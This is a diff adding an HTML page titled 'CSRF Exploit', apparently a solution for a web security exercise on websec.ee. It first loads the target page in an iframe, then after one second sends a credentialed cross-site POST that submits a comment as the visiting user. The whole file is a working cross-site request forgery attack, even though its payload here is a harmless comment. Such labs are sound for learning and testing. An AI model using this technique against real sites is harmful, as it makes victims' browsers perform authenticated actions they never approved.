@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+<iframe src="https://websec.ee/csrf/comments_samesite.php?pre_request=1"></iframe>
+<script>
+    function submitComment() {
+        var csrfUrl = 'https://websec.ee/csrf/comments_samesite.php';
+        var comment = 'Espresso Macchiato';
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', csrfUrl, true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.withCredentials = true;
+        xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                console.log('Comment submitted successfully!');
+            } else {
+                console.error('Failed to submit comment.');
+            }
+        };
+        xhr.onerror = function () {
+            console.error('Failed to submit comment.');
+        };
+        xhr.send('comment=' + comment);
+    }
+
+    setTimeout(submitComment, 1000);
+</script>
+</body>
+</html>
